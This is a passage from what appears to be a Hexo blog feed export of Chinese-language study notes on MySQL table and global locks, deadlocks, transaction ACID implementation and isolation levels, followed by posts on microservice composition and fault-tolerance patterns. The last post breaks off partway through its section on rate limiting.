<li>满足恢复和复制的需要</li>
</ol>
<p>MySQL 通过 BINLOG 录入执行成功的 INSERT、UPDATE、DELETE 等更新数据的 SQL 语句，并由此实现 MySQL 数据库的恢复和主从复制。MySQL 的恢复机制（复制其实就是在 Slave Mysql 不断做基于 BINLOG 的恢复）有以下特点：</p>
<ol>
<li><p>MySQL 的恢复是 SQL 语句级的，也就是重新执行 BINLOG 中的 SQL 语句。</p>
</li>
<li><p>MySQL 的 Binlog 是按照事务提交的先后顺序记录的， 恢复也是按这个顺序进行的。</p>
</li>
</ol>
<p>由此可见，MySQL 的恢复机制要求：在一个事务未提交前，其他并发事务不能插入满足其锁定条件的任何记录，也就是不允许出现幻读。</p>
<h3 id="表级锁"><a href="#表级锁" class="headerlink" title="表级锁"></a>表级锁</h3><p>表级锁的语法是</p>
<blockquote>
<p>LOCK TABLES table_name READ/WRITE</p>
<p>例如：LOCK TABLES t1 READ， t2 WRITE</p>
</blockquote>
<p>如果表被其他线程锁定了，当前线程会等待，直到获取了锁为止。</p>
<p>可以执行以下命令来释放锁 </p>
<blockquote>
<p>UNLOCK  TABLES</p>
</blockquote>
<p>UNLOCK TABLES会释放当前线程获得的所有锁。另外，当前线程执行另一个LOCK TABLES或者与服务器连接被关闭时，当前线程获得的所有锁将会被隐式释放。</p>
<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><ol>
<li>在用LOCK TABLES对InnoDB表加锁时，需要将AutoCommit设置为0，否则MySQL不会给表加锁</li>
<li>事务结束前，不要用UNLOCK TABLES 释放表锁，因为UNLOCK TABLES会隐式提交当前事务</li>
<li>COMMIT或者ROLLBACK并不能释放用LOCK TABLES加的表级锁，必须用UNLOCK TABLES释放表锁</li>
<li>lock tables 语法除了会限制别的线程的读写外，也限定了本线程接下来的操作对象。</li>
</ol>
<p>在上面的例子中，如果在某个线程 A 中执行 lock tables t1 read, t2 write; 这个语句，则其他线程写 t1、读写 t2 的语句都会被阻塞。同时，线程 A 在执行 unlock tables 之前，也只能执行读 t1、读写 t2 的操作。连写 t1 都不允许，自然也不能访问其他表。</p>
<h3 id="全局读锁"><a href="#全局读锁" class="headerlink" title="全局读锁"></a>全局读锁</h3><p><strong>全局锁的典型使用场景是，做全库逻辑备份（mysqldump）。重新做主从时候</strong><br>也就是把整库每个表都 select 出来存成文本。</p>
<p>数据库只读状态的危险性：</p>
<ul>
<li>如果你在主库上备份，那么在备份期间都不能执行更新，业务基本上就能停止。</li>
<li>如果你在从库上备份，那么备份期间从库不能执行主库同步过来的binlog，会导致主从延迟。</li>
</ul>
<h4 id="全局锁两种方法"><a href="#全局锁两种方法" class="headerlink" title="全局锁两种方法"></a>全局锁两种方法</h4><ol>
<li>FLUSH TABLES WRITE READ LOCK</li>
<li>set global readonly=true</li>
</ol>
<p>既然要全库只读，为什么不使用 set global readonly=true 的方式呢？确实 readonly 方式也可以让全库进入只读状态，建议用 FTWRL 方式，主要有几个原因：</p>
<ol>
<li>在有些系统中，readonly 的值会被用来做其他逻辑，比如用来判断一个库是主库还是备库。因此，修改 global 变量的方式影响面更大.</li>
<li>在异常处理机制上有差异。如果执行FTWRL 命令之后由于客户端发生异常断开，那么 MySQL 会自动释放这个全局锁，整个库回到可以正常更新的状态。而将整个库设置为 readonly 之后，如果客户端发生异常，则数据库就会一直保持 readonly 状态，这样会导致整个库长时间处于不可写状态，风险较高。</li>
<li>readonly 对super用户权限无效</li>
</ol>
<h2 id="InnoDB加锁方法"><a href="#InnoDB加锁方法" class="headerlink" title="InnoDB加锁方法"></a>InnoDB加锁方法</h2><ul>
<li>意向锁是InnoDB自动加的，不需要用户干预；</li>
<li>对于UPDATE、INSERT和DELETE语句，InnoDB会自动给涉及的数据集加排他锁（X）</li>
<li>对于普通SELECT语句，InnoDB不会加锁</li>
<li>事务可以通过以下语句显示地给数据集加共享锁或排他锁<ul>
<li>共享锁（S）：SELECT * FROM table_name WHERE … LOCK IN SHARE MODE。其他事务仍可以查询记录并对当前数据集加共享锁。但如果当前事务需要对该数据集进行更新操作，则很有可能造成死锁</li>
<li>排他锁（X）：SELECT * FROM table_name WHERE … FOR UPDATE.其他事务可以查询当前数据集，但是不能对该数据集加共享锁或排他锁。</li>
</ul>
</li>
</ul>
<p>InnoDB在事务执行的识货使用两阶段锁协议：</p>
<ol>
<li>随时都可以执行锁定，InnoDB会根据隔离级别在需要的时候自动加锁；</li>
<li>锁只有在执行commit或者rollback的时候才会释放，并且所有的锁都是在<strong>同一时刻</strong>被释放。</li>
</ol>
<h2 id="死锁处理"><a href="#死锁处理" class="headerlink" title="死锁处理"></a>死锁处理</h2><p>当不同的事务或线程出现循环资源依赖的时候，就会出现死锁。</p>
<p>比如，事务A获取了记录R1的写锁，修改成功之后，准备获取记录R2的写锁；而事务B先获取了记录R2的写锁，修改成功之后，准备获取R1的写锁。此时，事务AB等在等对方释放锁，就会产生死循环，造成死锁。</p>
<p><img src="https://huhansi.github.io/images/2020-04-11-deat-lock.png" alt="死锁"></p>
<h3 id="死锁对策"><a href="#死锁对策" class="headerlink" title="死锁对策"></a>死锁对策</h3><ol>
<li>主动等待超时，由参数 <code>innodb_lock_wait_timeout</code> 设置，但是业务无法等待；</li>
<li>主动死锁检测（<code>innodb_deadlock_detect=on</code>）</li>
</ol>
<p>发生死锁后，InnoDB 一般都可以检测到，并使一个事务释放锁回退，另一个则可以获取锁完成事务。</p>
<p>另外，我们可以采取以下方式避免死锁：</p>
<ul>
<li>通过表级锁来减少死锁产生的概率；</li>
<li>多个程序尽量约定以相同的顺序访问表（这也是解决并发理论中哲学家就餐问题的一种思路）；</li>
<li>同一个事务尽可能做到一次锁定所需要的所有资源。</li>
</ul>
<p>另外，死锁检测也非常耗费资源，判断会不会由于自己的加入导致了死锁，这是一个时间复杂度是 O(n) 的操作。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://hoxis.github.io/mysql-zhuanlan-06-07-lock.html" target="_blank" rel="noopener">MySQL实战 | 06/07 简单说说MySQL中的锁</a></p>
<p><a href="https://blog.csdn.net/eygle/article/details/94384306" target="_blank" rel="noopener">史上最详细MySQL全局锁和表锁</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/29150809" target="_blank" rel="noopener">MySQL锁总结</a></p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>锁</tag>
        <tag>死锁</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL事务原理以及4种隔离级别</title>
    <url>/2020/04/11/MySQL/2020-04-11-MySQL%E4%BA%8B%E5%8A%A1%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A4%E7%A7%8D%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB/</url>
    <content><![CDATA[<h1 id="MySQL事务原理及4种隔离级别"><a href="#MySQL事务原理及4种隔离级别" class="headerlink" title="MySQL事务原理及4种隔离级别"></a>MySQL事务原理及4种隔离级别</h1><h2 id="什么是事务"><a href="#什么是事务" class="headerlink" title="什么是事务"></a>什么是事务</h2><p>事务是关系型数据区区别于其他NoSQL数据库的一个主要方面，是保障数据一致性的重要手段。</p>
<p>事务会把数据库从一种一致性的状态转移到另外一种一致性的状态。在数据库事务提交的时候，事务可以确保要么所有的修改都已经生效保存，要么所有的修改都不保存。</p>
<p>拿一个常见的银行转账作为例子：A账户给B账户转账1000块买东西。在这个交易的过程中，有几个问题需要思考：</p>
<ul>
<li>如何<strong>同时保证</strong>上述交易中A账户总金额减少1000，B账户总金额增加1000？ （A）</li>
<li>A 账户如果同时在和C账户交易，如何让这两笔交易互不影响？（I）</li>
<li>如果交易完成时数据库突然崩溃，如何保证交易数据成功保存在数据库中？（D）</li>
<li>如何在支持大量交易的同时，保证数据的合法性（没有钱凭空产生或消失）？（C）</li>
</ul>
<p>要保证交易正常可靠地进行，数据库就得解决上面的四个问题，这也就是<code>事务</code>诞生的背景，它能解决上面的四个问题，对应地，它拥有四大特性：</p>
<ul>
<li>原子性（<strong>A</strong>tomicity）：一个事务必须被视为不可分割的最小工作单位，一个事务中的所有操作要么全部成功提交，要么全部失败回滚，对于一个事务来说不可能只执行其中的部分操作。</li>
<li>隔离性（<strong>I</strong>solation）：<strong>通常来说</strong>，一个事务所做的修改在最终提交以前，对其他事务是不可见的。下文讨论隔离级别的时候，就会发现为什么要说“通常来说”。</li>
<li>持久性（<strong>D</strong>urability）：一旦事务提交，则其所做的修改就会永久保存到数据库中。此时，即使系统崩溃，修改的数据也不会丢失。</li>
<li>一致性（<strong>C</strong>onsistency）：数据库总是从一个一致性的状态转换到另一个一致性的状态。</li>
</ul>
<h2 id="事务的实现原理"><a href="#事务的实现原理" class="headerlink" title="事务的实现原理"></a>事务的实现原理</h2><p>事务的最终目的是为了保证数据的一致性，因此，ACID中的AID就是为了实现C而做的铺垫。下面就分别看看原子性（A）、隔离性（I）、持久性（D）的实现原理。</p>
<h3 id="原子性实现原理（MySQL）"><a href="#原子性实现原理（MySQL）" class="headerlink" title="原子性实现原理（MySQL）"></a>原子性实现原理（MySQL）</h3><p>Undo Log是MySQL实现事务原子性的基础。当事务对数据库进行修改时，InnoDB会生成对应的Undo Log；如果事务实行失败或者调用了roolback，导致事务需要回滚，便可以利用Undo Log中的信息将数据回滚到修改之前的样子。</p>
<p>Undo Log属于逻辑日志，它记录的是sql执行的相关信息。当发生回滚时，InnoDB会根据Undo Log的内容做与之前相反的工作：对于每个Insert，回滚时会delete；每个delete，回滚时会insert；每个update就做一个相反的update，改回原数据。</p>
<p>拿上文A转账给B账户的例子来说</p>
<p>假设初始时候，A账户有10000，B账号有4000</p>
<blockquote>
<p>账户表-account</p>
</blockquote>
<table>
<thead>
<tr>
<th>id</th>
<th>account_name</th>
<th>balance</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>A</td>
<td>10000</td>
</tr>
<tr>
<td>2</td>
<td>B</td>
<td>4000</td>
</tr>
</tbody></table>
<p>执行了一个转账事务之后</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">start</span> <span class="keyword">transaction</span>;</span><br><span class="line"><span class="keyword">update</span> <span class="keyword">account</span> <span class="keyword">set</span> balance = balance - <span class="number">1000</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">update</span> <span class="keyword">account</span> <span class="keyword">set</span> balance = balance + <span class="number">1000</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">commit</span></span><br></pre></td></tr></table></figure>

<p>如果事务成功提交了，account表的内容就变成了</p>
<blockquote>
<p>账户表-account</p>
</blockquote>
<table>
<thead>
<tr>
<th>id</th>
<th>account_name</th>
<th>balance</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>A</td>
<td>9000</td>
</tr>
<tr>
<td>2</td>
<td>B</td>
<td>5000</td>
</tr>
</tbody></table>
<p>另外，MySQL还会给这个事务生成Undo Log</p>
<table>
<thead>
<tr>
<th>type</th>
<th>info</th>
</tr>
</thead>
<tbody><tr>
<td>update</td>
<td>table: account id:1 balance:10000</td>
</tr>
<tr>
<td>update</td>
<td>table:account id:2 balance:4000</td>
</tr>
</tbody></table>
<p>如果此时事务需要回滚，那么就可以根据Undo Log的信息，把数据恢复到修改之前的状态了。</p>
<h3 id="隔离性实现原理（MySQL）"><a href="#隔离性实现原理（MySQL）" class="headerlink" title="隔离性实现原理（MySQL）"></a>隔离性实现原理（MySQL）</h3><p>隔离性研究或者保证的是不同事务之间的影响。事务内部的操作和其他事务是隔离的，并发执行的各个事务之间不能互相干扰。</p>
<p>隔离性主要是通过锁机制和MVCC保证的。</p>
<p>锁机制保证一个事务的<strong>写</strong>操作不对另外一个事务的<strong>写</strong>操作产生影响</p>
<p>MVCC保证一个事务的<strong>写</strong>操作不对另外一个事务的<strong>读</strong>操作产生影响</p>
<h4 id="锁机制"><a href="#锁机制" class="headerlink" title="锁机制"></a>锁机制</h4><p>锁机制的原理可以概括为：事务在修改数据之前，需要先获得相应的锁；获得相应的锁之后，事务才可以修改数据；在当前事务操作期间，其他事务如果要来修改，只能等待当前事务提交或者回滚后释放锁。</p>
<p>MySQL锁按照粒度可以分为：</p>
<ul>
<li>表级锁：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高，并发度最低。支持引擎-MyISAM、MEMORY、InnoDB</li>
<li>行级锁：开销大，加锁慢；会出现死锁；锁定粒度小，发生锁冲突的概率最低，并发度也最高。支持引擎-InnoDB</li>
<li>页面锁：开销和加锁时间介于表锁和行锁之间；会出现死锁；锁定粒度介于表锁和行锁之间，并发度一般。支持引擎-BDB</li>
<li>全局所：对整个数据库实例加锁</li>
</ul>
<h4 id="MVCC"><a href="#MVCC" class="headerlink" title="MVCC"></a>MVCC</h4><p>MVCC全称是多版本并发控制（MultiVersion Concurrency Control）。InnoDB的MVCC是通过在每行记录的后面保存两个隐藏的列来实现的。这两个列，一个保存了行的创建时间，一个保存行的过期时间（或删除时间）。当然存储的并不是实际的时间值，而是系统版本号。每开始一个新的事物，系统版本号都会自动递增。事物开始时刻的系统版本号会作为事务的版本号，用来和查询到的每行记录的版本号作比较。</p>
<h3 id="持久性实现原理（MySQL）"><a href="#持久性实现原理（MySQL）" class="headerlink" title="持久性实现原理（MySQL）"></a>持久性实现原理（MySQL）</h3><p>持久性原理是通过Redo Log实现的。</p>
<p>数据库的数据是存放到磁盘中的，但如果每次读写数据都进行磁盘ID，效率无疑会很低下。因此，InnoDB引入了Buffer pool。Buffer pool包含了部分数据页的映射，作为缓冲。数据先从Buffer Pool中读取，如果没有，从磁盘读取后再放入Buffer Pool；同理，写入的话，也是先写入到Buffer Pool中，然后定期刷回磁盘。</p>
<p>Buffer Pool的使用大大提高了读写数据的效率，但也产生了新的问题：如果在Buffer Pool中的新数据还没有刷新到磁盘之前数据库就宕机了，就会导致数据丢失，误报保证事务的持久性。</p>
<p>于是Redo Log被引入来解决这个问题：当数据修改时，除了修改Buffer Pool中的数据，还会在Redo Log中记录这次操作；当事务提交时，会调用fsync接口对Redo Log进行刷盘。如果MySQL宕机，重启的时候可以读取Redo Log中的数据，对数据库进行恢复。</p>
<p>Redo Log采用的是WAL（Write-Ahead Loggin，预写式日志），所有修改先写入日志，再更新到Buffer Pool，保证了数据不会因为MySQL宕机二小时，从而满足了持久性要求。</p>
<h2 id="事务的隔离级别"><a href="#事务的隔离级别" class="headerlink" title="事务的隔离级别"></a>事务的隔离级别</h2><p>SQL标准中定义了四种隔离级别。级别越低的可以执行越高的并发， 但同时实现复杂度以及开销也越大。</p>
<p>MySQL中隔离级别有以下四种（级别由低到高）：</p>
<ul>
<li><strong>READ UNCOMMITED （读未提交）</strong></li>
<li><strong>READ COMMITED（读提交）</strong></li>
<li><strong>REPEATABLE READ（可重复读）</strong></li>
<li><strong>SERIALIZABLE（串行化）</strong></li>
</ul>
<p>我们还是从银行转账的例子举例说明这四个隔离级别。</p>
<h3 id="READ-UNCOMMITED（读未提交）"><a href="#READ-UNCOMMITED（读未提交）" class="headerlink" title="READ UNCOMMITED（读未提交）"></a>READ UNCOMMITED（读未提交）</h3><table>
<thead>
<tr>
<th>时间</th>
<th>事务T1</th>
<th>账户A余额</th>
<th>事务T2</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>start transaction</td>
<td>10000</td>
<td>start transaction</td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>update account set balance = balance - 1000 where id = 1</td>
<td>10000</td>
<td>select balance from account where id = 1</td>
<td>9000</td>
</tr>
<tr>
<td>3</td>
<td></td>
<td></td>
<td>commit</td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>commit</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>5</td>
<td></td>
<td>9000</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>在时间1，发起了两个事务T1和T2，T1给账号A扣除1000，T2查询账号A余额。在时间点2的时候，T1更新了A的余额，但是没有提交，此时T2查询A的余额，取得9000。在时间点4的时候，事务T1 commit。此时余额才真正为9000.</p>
<p>试想一下，如果事务T1在时间点4执行的时候发生异常，回滚了，那么A账号的余额还是为10000，那么事务在时间点2读取到的就是脏数据了。这就叫<strong>脏读</strong>。</p>
<h3 id="READ-COMMITED（读提交）"><a href="#READ-COMMITED（读提交）" class="headerlink" title="READ COMMITED（读提交）"></a>READ COMMITED（读提交）</h3><p>还是两个事务T1和T2修改账号A余额的例子。</p>
<table>
<thead>
<tr>
<th>时间点</th>
<th>事务T1</th>
<th>结果</th>
<th>事务T2</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>start transaction</td>
<td>余额1000</td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>select balance from account where id = 1</td>
<td>余额10000</td>
<td>start transaction</td>
<td>余额10000</td>
</tr>
<tr>
<td>3</td>
<td></td>
<td></td>
<td>update account set balance = balance - 1000 where id = 1</td>
<td>余额10000</td>
</tr>
<tr>
<td>4</td>
<td></td>
<td></td>
<td>commit</td>
<td>余额9000</td>
</tr>
<tr>
<td>5</td>
<td>select balance from account where id = 1</td>
<td>余额9000</td>
<td></td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>commit</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>造成这种情况的原因就是，事务T1在执行而未提交的过程中，事务T2修改了事务T1的数据项，并且这个修改对事务T1可见，造成事务T1两次读取到的数据不一致。这就叫<strong>不可重复读</strong>。</p>
<h3 id="Repeatable-Read（可重复读）"><a href="#Repeatable-Read（可重复读）" class="headerlink" title="Repeatable Read（可重复读）"></a>Repeatable Read（可重复读）</h3><p>在可重复读这个级别，是当前事务读取的数据是不会读取到其他事务对当前事务数据的修改的。但是它无法避免读取到新的数据。</p>
<table>
<thead>
<tr>
<th>时间点</th>
<th>事务T1</th>
<th>结果</th>
<th>事务T2</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>start transaction</td>
<td>10000；<br>4000</td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>select balance from account；</td>
<td>10000<br>4000</td>
<td>start transaction</td>
<td>10000<br>4000</td>
</tr>
<tr>
<td>3</td>
<td></td>
<td></td>
<td>insert into account values(3, “C”, 8000)</td>
<td>10000<br>4000</td>
</tr>
<tr>
<td>4</td>
<td></td>
<td></td>
<td>commit</td>
<td>10000<br>4000<br>8000</td>
</tr>
<tr>
<td>5</td>
<td>select balance from account;</td>
<td>10000<br>4000<br>8000</td>
<td></td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>commit</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="Serializable（串行化）"><a href="#Serializable（串行化）" class="headerlink" title="Serializable（串行化）"></a>Serializable（串行化）</h3><p>最高级别，这个级别下，所有的事务都串行执行。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://zhuanlan.zhihu.com/p/43493165" target="_blank" rel="noopener">深入理解数据库事务</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/86347112" target="_blank" rel="noopener">深入学习MySQL事务：ACID特性的实现原理</a></p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>事务</tag>
        <tag>ACID</tag>
        <tag>隔离级别</tag>
        <tag>可重复读</tag>
        <tag>读提交</tag>
        <tag>读未提交</tag>
        <tag>串行化</tag>
      </tags>
  </entry>
  <entry>
    <title>微服务的分解和组合模式</title>
    <url>/2020/04/11/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%86%E5%B8%83%E5%BC%8F%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86%E3%80%81%E6%A1%86%E6%9E%B6%E4%B8%8E%E5%AE%9E%E6%88%98/2020-04-11-%E5%88%86%E5%B8%83%E5%BC%8F1-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%9A%84%E5%88%86%E8%A7%A3%E5%92%8C%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="微服务的分解和组合模式"><a href="#微服务的分解和组合模式" class="headerlink" title="微服务的分解和组合模式"></a>微服务的分解和组合模式</h1><p>使用微服务架构划分服务和团队是微服务架构实施的重要一步，良好的划分和拆分是使系统达到松耦合和高内聚的效果，然后通过微服务的灵活组装可以满足上层各种各样的业务处理需求。</p>
<p>在微服务架构的需求分析和架构设计过程中，通常是用领域的动词和名词来划分微服务的。例如，对于一个电商后台系统，可以分解为订单、商品、商品目录、库存、购物车、交易、支付、发票、物流等子系统，每个名词和动词都可以是一个微服务，将这几个微服务组合在一起，就实现了电商平台用户购买商品的整个业务流。</p>
<p>这样拆分以后，系统具有敏捷性、灵活性、可伸缩性等，拆分后有多个高度自治的微服务，可以按照以下几种方式组合微服务。</p>
<h2 id="服务代理模式"><a href="#服务代理模式" class="headerlink" title="服务代理模式"></a>服务代理模式</h2><p>服务代理模式是最简单的服务组合模式，它根据业务的需求选择调用后端的某个服务。在返回给使用端之前，代理可以选择性地对后端服务的输出进行加工。</p>
<p>服务代理模式的架构如下图所示：</p>
<p><img src="https://huhansi.github.io/images/2020-04-11-proxy1.png" alt="服务代理模式"></p>
<h2 id="服务聚合模式"><a href="#服务聚合模式" class="headerlink" title="服务聚合模式"></a>服务聚合模式</h2><p>服务聚合模式是最常用的服务组合模式，它根据业务流程处理的需要，以一定的顺序调用依赖的多个微服务，对依赖的微服务返回的数据进行组合、加工和转换，最后以一定的形式返回给使用方。</p>
<p>这里每个被依赖的微服务都有自己的缓存和数据库，聚合服务本身可以有自己的数据存储，包括缓存和数据库等，也可以是简单的聚合，不需要持久化任何数据。</p>
<p>服务聚合模式的架构如下图所示：</p>
<p><img src="https://huhansi.github.io/images/2020-04-11-juhe.png" alt="服务聚合模式"></p>
<p>这里体现了DRY（Don’t Repeat Yourself）原则的设计理念，在设计或者构造应用时，最大限度地重用了现有的实现。</p>
<p>这样的设计原则有如下的好处：</p>
<ul>
<li>三个独立的子服务可以各自独立开发、敏捷变更和部署</li>
<li>聚合服务封装下层的业务处理服务，由三个独立的子服务完成数据持久化等工作，项目结构清晰明了</li>
<li>三个独立的子服务对于其他使用方仍然可以重用</li>
</ul>
<h2 id="服务串联模式"><a href="#服务串联模式" class="headerlink" title="服务串联模式"></a>服务串联模式</h2><p>服务串联模式类似于一个工作流，最前面的服务1负责接收请求和响应使用方，串联服务后再与服务1交互，随后服务1与服务2交互，最后从服务2产生的结果经过服务1和串联服务逐个处理后返回给使用方。</p>
<p>串联模式的架构如下图所示：</p>
<p><img src="https://huhansi.github.io/images/2020-04-11-chuanlian.png" alt="服务聚合模式"></p>
<p>服务串联模式之间的调用通常使用同步的RESTFul风格的远程调用实现，注意，这种模式采用的是同步调用的方式，在串联服务还没有完成并返回之前，所有服务都会阻塞和等待，一个请求会占用一个线程来处理，因此，在这种模式下不建议服务的层级太多，如果能用服务聚合模式代替，则优先使用服务聚合模式，而不是使用这种服务串联模式。</p>
<p>相对于服务聚合模式，服务串联模式有一个优点，即串联链路上再增加一个节点时，只要不是在串联服务的正后面增加，那么串联服务是无感知的。</p>
<p><img src="https://huhansi.github.io/images/2020-04-11-chuanlian2.png" alt="服务串联模式新增节点"></p>
<h2 id="服务分支模式"><a href="#服务分支模式" class="headerlink" title="服务分支模式"></a>服务分支模式</h2><p>服务分支模式是服务代理模式、服务聚合模式和服务串联模式相结合的产物。分支服务可以拥有自己的数据库存储，电泳多个后端的服务或者服务串联链，然后将结果进行组合处理再返回给客户端。分支服务也可以使用代理模式，简单地调用后端的某个服务或者服务链，然后将返回的数据直接返回给使用方。</p>
<p>分支模式的架构如下图所示：</p>
<p><img src="https://huhansi.github.io/images/2020-04-11-fenzhi.png" alt="服务分支模式"></p>
<p>分支模式会方法服务间的依赖关系，因此在显示的微服务设计中尽量保持服务调用级别的简单，在使用服务组合和服务代理模式时，不要使用服务串联模式和服务分支模式，以保持服务依赖关系的清晰明了，这也减少了日后维护的工作量。</p>
<h2 id="服务异步消息模式"><a href="#服务异步消息模式" class="headerlink" title="服务异步消息模式"></a>服务异步消息模式</h2><p>前面所有服务组合模式都使用同步的RESTFul风格的同步调用来实现，同步调用模式在调用的过程中会阻塞线程，如果服务提供方迟迟没有返回，则服务消费方会一直阻塞，在严重情况下会撑满服务的线程池，出现雪崩效应。</p>
<p>因此在构建微服务架构时，通常会梳理核心系统的最小化服务集合，这些核心的系统服务使用同步调用，而其他核心链路以外的服务可以使用异步消息队列进行异步化。</p>
<p>服务异步消息模式的架构如下图所示：</p>
<p><img src="https://huhansi.github.io/images/2020-04-11-yibu.png" alt="服务异步消息模式"></p>
<h2 id="服务共享数据模式"><a href="#服务共享数据模式" class="headerlink" title="服务共享数据模式"></a>服务共享数据模式</h2><p>服务共享数据模式其实是反模式。由于去掉了数据共享，所以仅通过服务之间良好定义的接口进行交互和通信，使得每个服务都是自治的。</p>
<p>服务共享模式的架构如下图所示：</p>
<p><img src="https://huhansi.github.io/images/2020-04-11-share.png" alt="服务共享数据模式"></p>
<h3 id="单元化架构"><a href="#单元化架构" class="headerlink" title="单元化架构"></a>单元化架构</h3><p>一些平台由于对性能有较高的要求，所以采用微服务化将服务进行拆分，通过网络服务进行通信，尽管网络通信的带宽已经很宽， 但还是会有性能方面的损耗，在这种场景下，可以让不同的微服务共享一些资源，例如：缓存、数据库等，甚至可以将缓存和数据在物理拓扑上和微服务部署字啊一个物理机中，最大限度减少网络通行带来的性能损耗，我们将这种方法为“单元化架构”。</p>
<p>单元化架构如下图所示：</p>
<p><img src="https://huhansi.github.io/images/2020-04-11-danyuanhua.png" alt="单元化架构"></p>
<h3 id="遗留的整体服务"><a href="#遗留的整体服务" class="headerlink" title="遗留的整体服务"></a>遗留的整体服务</h3><p>对于历史遗留的传统单体服务，我们在重构微服务的过程中，发现单体服务依赖的数据表耦合在一起，对其拆分需要进行反规范化的处理，可能会造成数据一致性问题，在没有完全理解和有把握的前提下，会选择保持现状，让不同的微服务暂时共享数据存储。</p>
<p>除了上面提到的两个场景，<strong>任何场景都不能使用服务数据共享模式</strong>。</p>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>微服务架构</tag>
        <tag>服务代理模式</tag>
        <tag>服务聚合模式</tag>
        <tag>服务串联模式</tag>
        <tag>服务分支模式</tag>
        <tag>服务异步消息模式</tag>
        <tag>服务共享数据模式</tag>
      </tags>
  </entry>
  <entry>
    <title>微服务容错模式</title>
    <url>/2020/04/11/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%86%E5%B8%83%E5%BC%8F%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86%E3%80%81%E6%A1%86%E6%9E%B6%E4%B8%8E%E5%AE%9E%E6%88%98/2020-04-11-%E5%88%86%E5%B8%83%E5%BC%8F2-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%9A%84%E5%AE%B9%E9%94%99%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="微服务的容错模式"><a href="#微服务的容错模式" class="headerlink" title="微服务的容错模式"></a>微服务的容错模式</h1><p>在使用了微服务架构以后，整体的业务流程被拆分成小的微服务，并组合在一起对外提供服务，微服务之间使用轻量级的网络通信协议，通常是RESTFul风格的远程调用。由于服务与服务的调用不再是进程内的调用，而是通过网络进行的远程调用，众所周知，网络通信是不稳定、不可靠的，一个服务依赖的服务可能会出错、超时或者宕机，如果没有及时发现和隔离问题，或者在设计中没有考虑如何应对这样的问题，那么很可能在短时间内服务的线程池中的线程被用满，资源耗尽，导致出现雪崩效应。</p>
<h2 id="舱壁隔离模式"><a href="#舱壁隔离模式" class="headerlink" title="舱壁隔离模式"></a>舱壁隔离模式</h2><p>这里用航船的设计比喻舱壁隔离模式，若一艘航船遇到了意外事故，其中一个船舱进了水，则我们希望这个船舱和其他船舱是隔离的，不受影响。在微服务架构中，这主要体现在下面两个方面：</p>
<h3 id="微服务容器分组"><a href="#微服务容器分组" class="headerlink" title="微服务容器分组"></a>微服务容器分组</h3><p>将不同的微服务或者不同环境下的服务分布在不同的容器中，这样，一旦其中某个微服务除了问题，导致节点宕机，也只会影响到和它同一个容器中的服务，对其他容器外的服务没有影响。</p>
<p><img src="https://huhansi.github.io/images/2020-04-11-rongqifenzu.png" alt="容器分组"></p>
<h3 id="线程池隔离"><a href="#线程池隔离" class="headerlink" title="线程池隔离"></a>线程池隔离</h3><p>在微服务架构实施的过程中，也可以使用线程池来隔离不同的微服务。</p>
<p><img src="https://huhansi.github.io/images/2020-04-11-threadpool.png" alt="容器分组"></p>
<h2 id="熔断模式"><a href="#熔断模式" class="headerlink" title="熔断模式"></a>熔断模式</h2><p>当服务地输入负载迅速增加时，如果没有有效的措施对负载进行熔断，则会使服务迅速被压垮，服务被压垮会导致依赖的服务被压垮，出现雪崩效应，一女子可以模拟家庭的电路保险开关，在微服务架构中实现熔断模式。</p>
<p>熔断模式的状态流转如下图所示：</p>
<p><img src="https://huhansi.github.io/images/2020-04-11-rongduan.png" alt="熔断模式"></p>
<h2 id="限流模式"><a href="#限流模式" class="headerlink" title="限流模式"></a>限流模式</h2><p>针对服务突然上量，我们必须由限流机制。限流机制一般会控制访问的并发量。有以下几种主流的方法实现限流。</p>
